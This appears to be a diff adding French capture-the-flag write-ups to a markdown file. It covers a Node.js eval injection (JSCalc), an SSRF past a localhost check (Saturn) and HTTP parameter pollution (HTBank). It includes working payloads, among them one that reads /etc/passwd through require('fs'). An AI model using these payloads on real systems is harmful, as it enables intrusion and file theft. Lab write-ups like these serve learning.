@@ -312,3 +312,106 @@ URL finale à forger :
     http://83.136.251.235:45235/?url=@0.0.0.0:1337/debug/environment
     
 Le flag se trouve dans une des variables d'environnement.
+
+
+## JSCalc
+
+Le site semble être une simple calculatrice, et le titre nous indique qu'elle utilise la fonction **eval()**
+
+Et en effet dans le fichier **calculatorHelper.js** on observe le morceau de code suivant : 
+
+    module.exports = {
+        calculate(formula) {
+            try {
+                return eval(`(function() { return ${ formula } ;}())`);
+
+            } catch (e) {
+                if (e instanceof SyntaxError) {
+                    return 'Something went wrong!';
+                }
+            }
+        }
+    }
+
+
+Le site utilise des templates de la forme "${ formula }"
+
+J'ai directement essayé de lire un fichier et cela a fonctionné : 
+
+    {"formula":"require('fs').readFileSync('/etc/passwd').toString();"}
+ 
+Il n'y avait plus qu'à reproduire le même payload avec le flag :
+
+    {"formula":"require('fs').readFileSync('/flag.txt').toString();"}
+    
+
+## Saturn 
+
+Le site propose de nous "cacher" avec son proxy et ne contient qu'un formulaire demandant une URL.
+
+Dans le fichier **app.py** on voit que le site utilise un système de templates, et également la condition d'obtention du flag : 
+
+
+    @app.route('/secret')
+    def secret():
+        if request.remote_addr == '127.0.0.1':
+            flag = ""
+            with open('./flag.txt') as f:
+                flag = f.readline()
+            return render_template('secret.html', SECRET=flag)
+        else:
+            return render_template('forbidden.html'), 403
+
+En essayant d'aller manuellement sur cette dernière route, on a un "Access denied" comme prévu.
+
+Un simple URL Shortener qui ne bloque pas les adresses en 127 comme https://cutt.ly/ suffit à contourner. On a bien une redirection sur le flag.
+
+## HTBank
+
+On arrive sur un formulaire de login, mais il y a la possibilité de s'enregistrer donc inutile de chercher à le contourner. 
+
+Après l'enregistrement puis l'authentification, une interface se présente avec notre nom d'utilisateur, notre solde en "HTB_Credits" et une adresse de wallet.
+
+Deux boutons : 
+
+- "Withdraw money" => Demande un numéro de compte et un montant
+- "Add money" => Ne fait rien
+
+Dans le fichier **WithdrawController.php** on trouve la condition d'obtention du flag : 
+
+    public function index($router)
+        {
+            $amount = $_POST['amount'];
+            $account = $_POST['account'];
+
+            if ($amount == 1337) {
+                $this->database->query('UPDATE flag set show_flag=1');
+
+                return $router->jsonify([
+                    'message' => 'OK'
+                ]);
+            }
+
+            return $router->jsonify([
+                'message' => 'We don\'t accept that amount'
+            ]);
+        }
+
+Il suffirait donc de retirer 1337 HTB_Credits, mais on n'a pas assez de crédits pour le faire.
+
+En interceptant la requête avec Burp, j'ai pollué le paramètre "amount" (bien mettre le 0 d'abord pour valider la condition et ne pas se faire rejeter, puisque l'on possède 0 crédits) et j'ai eu un message "OK" : 
+
+    ...
+    ------WebKitFormBoundaryvlMuH68gPztfBx1D
+    Content-Disposition: form-data; name="amount"
+
+    0
+    ------WebKitFormBoundaryvlMuH68gPztfBx1D
+    Content-Disposition: form-data; name="amount"
+
+    1337
+    ------WebKitFormBoundaryvlMuH68gPztfBx1D--
+    ...
+    
+
+En revenant sur l'interface et en rafraîchissant la page, le flag apparaît.
